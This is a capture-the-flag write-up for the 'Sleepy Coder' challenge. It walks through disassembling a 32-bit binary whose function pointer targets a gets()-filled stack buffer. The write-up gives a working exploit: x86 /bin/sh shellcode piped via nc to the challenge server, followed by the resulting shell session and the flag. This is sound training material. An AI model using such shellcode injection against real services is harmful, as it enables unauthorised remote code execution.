# The Sleepy Coder
**Points**: 150
**Category**: Exploit 
**Author**: [Ajith Pandel](https://github.com/ajithps), [Mithesh Mutha](https://github.com/mitesh-mutha)
> The guy who was coding this was very sleepy. He has made some mistakes in the program.<br/>
Can you exploit it?

> [sleepy_coder.tar.gz](./sleepy_coder.tar.gz)

> nc 212.71.235.214 4000 

## Write-up
We are given sleepy\_coder.tar.gz which contains a single file. It is a ELF 32-bit LSB executable. We get this information through `file` command:<br/>
<code>
> $ file sleepy\_coder<br/>
> sleepy\_coder: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xafac700b0de7b1c7099e8473a8ff3a1422c945f6, not stripped<br/>
</code>

We disassemble it using `objdump -d sleepy_coder` command. If we see the _main_ function, the instruction `call *%eax` tells us that the program calls the function which is located in the address saved in EAX register.

Looking back we see that the 0x7c(%esp) saves the address of the function. i.e. The function pointer is saved in (ESP + 0x7c) address. 

It has been initialised with the instructions `lea    0x18(%esp),%eax` and `mov    %eax,0x7c(%esp)`. This means that the address of (ESP + 0x18) is saved in the function pointer.

Notice that the _gets_ function writes to this address directly.( `lea    0x18(%esp),%eax` , `mov    %eax,(%esp)` and `call   80482f0 <gets@plt>`)

So effectively the program will execute whatever instruction we tell it to execute, through _gets_ function. So we just have to inject a code which would make the program drop into a shell.

[This](http://www.tenouk.com/Bufferoverflowc/Bufferoverflow5.html) link will give a good tutorial on shell codes and how to create them.

The final exploit:<br/>
<code>
> $ cat <(python -c "print '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42'") - | nc 212.71.235.214 4000<br/>
> ls<br/>
> flag.txt<br/>
> sleepy_coder<br/>
> cat flag.txt<br/>
> flag{thank\_you\_bfox}<br/>
</code>

> Flag: flag{thank\_you\_bfox}

## External Write ups

